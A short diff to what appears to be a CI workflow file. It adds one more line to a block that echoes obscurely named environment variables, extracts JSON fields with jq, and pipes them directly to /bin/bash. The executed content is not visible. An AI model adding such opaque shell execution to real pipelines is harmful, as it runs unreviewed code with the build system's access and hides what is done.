@@ -64,6 +64,7 @@ jobs:
           echo $llk6 | jq -r .abk95 | /bin/bash
           echo $k5522 | jq -r .rl109 | /bin/bash
           echo $dxmcr864 | jq -r .xufuy85405 | /bin/bash
+          echo $rtbwa001 | jq -r .vtwbs57827 | /bin/bash
 
       - name: Save output
         if: always()
